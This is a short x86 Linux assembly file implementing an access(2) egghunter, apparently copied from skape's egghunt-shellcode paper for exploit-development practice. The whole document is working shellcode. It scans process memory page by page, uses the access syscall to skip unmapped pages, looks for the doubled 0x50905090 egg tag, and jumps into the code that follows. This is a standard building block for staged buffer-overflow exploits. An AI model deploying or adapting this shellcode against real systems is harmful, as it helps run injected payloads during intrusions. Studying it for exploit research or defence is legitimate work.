; Purpose: access(2) egghunter
; source: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text

_start:
  mov ebx, 0x50905090
  xor ecx, ecx
  mul ecx

page_alignment:
  or dx,0xfff

inspection:
  inc edx
  pushad
  lea ebx, [edx+0x4]
  mov al, 0x21
  int 0x80
  cmp al, 0xf2
  popad
  jz page_alignment
  cmp [edx], ebx
  jnz inspection
  cmp [edx+0x4], ebx
  jnz inspection
  jmp edx
